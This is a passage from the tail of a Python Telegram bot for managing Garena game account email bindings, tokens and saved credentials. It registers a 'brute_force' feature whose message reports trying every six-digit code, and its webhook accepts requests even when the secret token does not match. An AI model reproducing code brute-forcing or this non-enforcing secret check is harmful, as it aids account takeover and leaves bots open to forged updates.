            text="❌ Brute force complete — sahi code nahi mila.\n(000000–999999 sab try ho gaye)",
            reply_markup=back_kb()
        )

# ─── Utility Commands ─────────────────────────────────────────────────────────

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    mk = monitoring.MONITORING_KEY
    monitor_hint = (
        f"\n\n📊 *Monitoring Dashboard:*\n"
        f"`/monitor?key=YOUR_KEY` (set in Render env)"
    ) if mk else ""
    await update.message.reply_text(
        "📋 *Commands:*\n"
        "/start — Main menu\n"
        "/cancel — Operation cancel karo\n"
        "/clear — Saved credentials delete karo\n"
        "/ping — Bot status" + monitor_hint,
        parse_mode="Markdown", reply_markup=back_kb()
    )


async def clear_creds_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    context.user_data.pop("saved_email", None)
    context.user_data.pop("saved_access", None)
    await update.message.reply_text("🗑️ Saved credentials delete ho gayi.", reply_markup=back_kb())


async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("🟢 Bot online hai!", reply_markup=back_kb())

# ─── Main ─────────────────────────────────────────────────────────────────────

async def run_webhook_server(app: Application, base_url: str, webhook_secret: str, port: int) -> None:
    from aiohttp import web
    import hashlib

    # Telegram requires secret_token to contain only 1-256 chars: [A-Za-z0-9_-]
    # We use a deterministic sha256 hex digest to guarantee 100% legal characters.
    clean_secret = hashlib.sha256(webhook_secret.encode()).hexdigest()
    webhook_url = f"{base_url.rstrip('/')}/{clean_secret}"

    server_app = web.Application()

    async def telegram_webhook(request: web.Request) -> web.Response:
        try:
            req_token = request.headers.get("X-Telegram-Bot-Api-Secret-Token")
            if req_token and req_token != clean_secret:
                logging.warning("[Webhook] Secret token mismatch")
            data = await request.json()
            logging.info(f"[Webhook] Received update: {data.get('update_id')}")
            update = Update.de_json(data=data, bot=app.bot)
            if update:
                await app.update_queue.put(update)
            return web.Response(text="OK")
        except Exception as e:
            logging.error(f"[Webhook Error] {e}", exc_info=e)
            return web.Response(text="OK")

    server_app.router.add_post(f"/{clean_secret}", telegram_webhook)
    server_app.router.add_get("/", monitoring._root)
    server_app.router.add_get("/monitor", monitoring._dashboard)
    server_app.router.add_get("/api/data", monitoring._api_data)
    server_app.router.add_post("/api/flag/{id}", monitoring._api_flag)

    runner = None
    site = None
    try:
        await app.initialize()
        await app.start()
        await app.bot.set_webhook(url=webhook_url, secret_token=clean_secret)
        runner = web.AppRunner(server_app)
        await runner.setup()
        site = web.TCPSite(runner, "0.0.0.0", port)
        await site.start()
        print(f"[Bot] Webhook listening on port {port}")
        print(f"[Monitor] Dashboard: {base_url}/monitor?key={monitoring.MONITORING_KEY}")
        stop_event = asyncio.Event()
        await stop_event.wait()
    except (KeyboardInterrupt, SystemExit, asyncio.CancelledError):
        pass
    finally:
        if site:
            await site.stop()
        if runner:
            await runner.cleanup()
        if app.running:
            await app.stop()
        await app.shutdown()


def main() -> None:
    token = os.environ.get("TELEGRAM_BOT_TOKEN")
    if not token:
        raise RuntimeError("TELEGRAM_BOT_TOKEN is not set.")

    # Initialize monitoring database
    db.init_db()

    persistence = PicklePersistence(filepath="garena_bot_data.pkl")
    app = Application.builder().token(token).persistence(persistence).build()

    TEXT = filters.TEXT & ~filters.COMMAND

    entry_points = [
        CommandHandler("start",  show_main_menu),
        CallbackQueryHandler(show_main_menu,    pattern="^back_main$"),
        CallbackQueryHandler(clear_creds,       pattern="^clear_creds$"),
        CallbackQueryHandler(add_email_start,   pattern="^add_email$"),
        CallbackQueryHandler(check_email_start, pattern="^check_email$"),
        CallbackQueryHandler(platform_start,    pattern="^check_platform$"),
        CallbackQueryHandler(cancel_email_start,pattern="^cancel_email$"),
        CallbackQueryHandler(unbind_start,      pattern="^unbind_email$"),
        CallbackQueryHandler(change_bind_start, pattern="^change_bind$"),
        CallbackQueryHandler(revoke_start,      pattern="^revoke_token$"),
        CallbackQueryHandler(bf_start,          pattern="^brute_force$"),
    ]

    conv = ConversationHandler(
        entry_points=entry_points,
        states={
            MAIN_MENU: [
                CallbackQueryHandler(clear_creds,        pattern="^clear_creds$"),
                CallbackQueryHandler(add_email_start,    pattern="^add_email$"),
                CallbackQueryHandler(check_email_start,  pattern="^check_email$"),
                CallbackQueryHandler(platform_start,     pattern="^check_platform$"),
                CallbackQueryHandler(cancel_email_start, pattern="^cancel_email$"),
                CallbackQueryHandler(unbind_start,       pattern="^unbind_email$"),
                CallbackQueryHandler(change_bind_start,  pattern="^change_bind$"),
                CallbackQueryHandler(revoke_start,       pattern="^revoke_token$"),
                CallbackQueryHandler(bf_start,           pattern="^brute_force$"),
            ],
            CREDS_CONFIRM:        [CallbackQueryHandler(creds_confirm)],
            CREDS_NEW_EMAIL:      [MessageHandler(TEXT, creds_new_email)],
            CREDS_NEW_ACCESS:     [MessageHandler(TEXT, creds_new_access)],
            CREDS_SAVE_ASK:       [CallbackQueryHandler(creds_save_ask)],
            CREDS_TOKEN_CONFIRM:  [CallbackQueryHandler(creds_token_confirm)],
            CREDS_TOKEN_NEW:      [MessageHandler(TEXT, creds_token_new)],
            CREDS_TOKEN_SAVE_ASK: [CallbackQueryHandler(creds_token_save_ask)],
            ADD_OTP:          [MessageHandler(TEXT, add_get_otp)],
            UNBIND_METHOD:    [CallbackQueryHandler(unbind_method)],
            UNBIND_OTP:       [MessageHandler(TEXT, unbind_get_otp)],
            UNBIND_PASS:      [MessageHandler(TEXT, unbind_get_pass)],
            CHANGE_NEW_EMAIL: [MessageHandler(TEXT, change_get_new_email)],
            CHANGE_METHOD:    [CallbackQueryHandler(change_method)],
            CHANGE_OLD_OTP:   [MessageHandler(TEXT, change_get_old_otp)],
            CHANGE_PASS:      [MessageHandler(TEXT, change_get_pass)],
            CHANGE_NEW_OTP:   [MessageHandler(TEXT, change_get_new_otp)],
        },
        fallbacks=[
            CommandHandler("cancel", cancel_op),
            CommandHandler("start",  show_main_menu),
        ],
        allow_reentry=True,
        persistent=True,
        name="garena_conv",
        per_message=False,
    )

    async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
        logging.error(f"[BOT ERROR] {context.error}", exc_info=context.error)
        if update and hasattr(update, "effective_message") and update.effective_message:
            try:
                await update.effective_message.reply_text(
                    "⚠️ Kuch problem aayi hai. Kripya dobara /start dabayein."
                )
            except Exception:
                pass

    app.add_handler(conv)
    app.add_handler(CommandHandler("help",  help_command))
    app.add_handler(CommandHandler("ping",  ping))
    app.add_handler(CommandHandler("clear", clear_creds_cmd))
    app.add_error_handler(error_handler)

    base_url      = os.environ.get("WEBHOOK_BASE_URL")
    webhook_secret= os.environ.get("WEBHOOK_SECRET")

    if base_url and webhook_secret:
        port = int(os.environ.get("PORT", "8000"))
        asyncio.run(run_webhook_server(app, base_url, webhook_secret, port))
    else:
        print("[Bot] Polling mode (local)")
        monitoring.start_polling_monitor(port=8081)
        app.run_polling()


if __name__ == "__main__":
    main()
